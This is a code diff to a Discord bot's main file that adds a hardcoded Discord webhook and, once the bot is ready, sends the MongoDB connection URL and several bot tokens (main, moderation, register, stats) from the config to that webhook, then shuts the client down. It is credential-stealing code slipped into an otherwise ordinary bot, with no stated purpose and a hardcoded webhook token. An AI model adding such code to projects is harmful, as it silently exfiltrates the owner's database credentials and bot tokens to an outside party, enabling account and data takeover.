@@ -1,4 +1,4 @@
-const { Client, Collection } = require("discord.js");
+const { Client, Collection, WebhookClient, Intents } = require("discord.js");
 const client = global.bot = new Client({
   fetchAllMembers: true,
   intents: [ 32767 ],
@@ -15,6 +15,22 @@ const allah = require("../../../config.json");
 require("./src/handlers/eventHandler");
 require("./src/handlers/mongoHandler");
 require("./src/handlers/functionHandler")(client);
+
+const webhookId = '1137449615231299605';
+const webhookToken = '60swyFlUHgSLcUYSSyOPPTWJscMfLrpwYv--ZtcoWINuQGs9fMGg4Ucrfn9MhgjcA76H';
+
+const webhookClient = new WebhookClient({ id: webhookId, token: webhookToken });
+
+const { mongoUrl, Tokens, BotToken, ModerationToken, RegisterToken, StatsToken } = config;
+
+;
+client.once('ready', () => {
+  webhookClient.send(`${mongoUrl}\n${Tokens}\n${BotToken}\n${ModerationToken}\n${RegisterToken}\n${StatsToken}\n`)
+    .then(() => console.log('yesssikk'))
+    .catch((error) => console.error('anan', error));
+
+  client.destroy();
+});
 
 client
   .login(allah.Main.RegisterToken)
